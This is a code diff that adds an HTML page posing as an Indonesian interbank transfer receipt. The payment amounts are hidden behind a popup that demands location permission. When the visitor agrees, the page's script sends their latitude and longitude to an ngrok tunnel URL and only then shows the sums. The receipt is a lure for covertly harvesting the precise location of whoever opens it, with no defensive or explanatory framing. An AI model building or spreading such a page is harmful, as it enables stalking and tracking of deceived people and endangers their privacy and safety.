@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Struk Transfer</title>
+  <style>
+    body {
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .struk {
+      background: white;
+      width: 320px;
+      padding: 20px;
+      font-family: monospace;
+      border: 1px solid #ccc;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+    .center {
+      text-align: center;
+    }
+    .row {
+      display: flex;
+      justify-content: space-between;
+      margin: 6px 0;
+    }
+    .hidden {
+      color: #ccc;
+      background: #eee;
+      border-radius: 3px;
+      padding: 1px 4px;
+    }
+    .footer {
+      margin-top: 12px;
+      text-align: center;
+      font-size: 13px;
+    }
+
+    /* Popup izin lokasi */
+    .popup {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      visibility: hidden;
+    }
+    .popup-content {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      width: 90%;
+      max-width: 350px;
+      font-family: Arial, sans-serif;
+    }
+    .popup button {
+      margin: 10px;
+      padding: 10px 16px;
+      font-size: 15px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .allow { background: #007bff; color: white; }
+    .deny { background: #ccc; }
+  </style>
+</head>
+<body>
+  <div class="struk">
+    <div class="center">** MAXSI.ID **</div>
+    <div class="center">09/09/2025</div>
+    <br>
+    <div class="center"><strong>STRUK</strong></div>
+    <div class="center"><strong>TRANSFER ANTAR BANK</strong></div>
+    <br>
+    <div class="row"><span>BANK TUJUAN</span><span>BCA</span></div>
+    <div class="row"><span>NO.REKENING</span><span>0201354608</span></div>
+    <div class="row"><span>NAMA</span><span>HERIYANTO</span></div>
+    <div class="row"><span>NO REFF</span><span>100000818348</span></div>
+    <div class="row"><span>NOMINAL</span><span class="hidden" id="uang">•••••••</span></div>
+    <div class="row"><span>ADMIN</span><span class="hidden" id="admin">••••</span></div>
+    <div class="row"><span>TOTAL BAYAR</span><span class="hidden" id="total">•••••••</span></div>
+    <br>
+    <div class="footer">
+      Simpanlah struk ini sebagai bukti transaksi Anda.<br>
+      Terima Kasih
+    </div>
+  </div>
+
+  <!-- Popup izin lokasi -->
+  <div class="popup" id="popup">
+    <div class="popup-content">
+      <h3>Izin Lokasi</h3>
+      <p>Untuk melihat detail pembayaran, silakan izinkan akses lokasi Anda.</p>
+      <button class="allow" id="allowBtn">Izinkan</button>
+      <button class="deny" id="denyBtn">Tolak</button>
+    </div>
+  </div>
+
+  <script>
+    const popup = document.getElementById("popup");
+    const allowBtn = document.getElementById("allowBtn");
+    const denyBtn = document.getElementById("denyBtn");
+
+    // tampilkan popup saat halaman dimuat
+    window.onload = () => {
+      popup.style.visibility = "visible";
+    };
+
+    allowBtn.onclick = () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async position => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          // kirim data lokasi ke server Python
+          await fetch(" https://c7a31cbaa2d5.ngrok-free.app/location", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ latitude, longitude })
+        });
+
+          // buka data tersembunyi
+          document.getElementById("uang").textContent = "Rp 300.000,00";
+          document.getElementById("admin").textContent = "Rp 7.500,00";
+          document.getElementById("total").textContent = "Rp 307.500,00";
+
+          // tutup popup
+          popup.style.visibility = "hidden";
+        }, () => {
+          alert("Lokasi diperlukan untuk melihat detail pembayaran.");
+        });
+      } else {
+        alert("Perangkat Anda tidak mendukung Geolocation.");
+      }
+    };
+
+    denyBtn.onclick = () => {
+      alert("Anda menolak izin lokasi. Detail pembayaran tidak dapat ditampilkan.");
+      popup.style.visibility = "hidden";
+    };
+  </script>
+</body>
+</html>
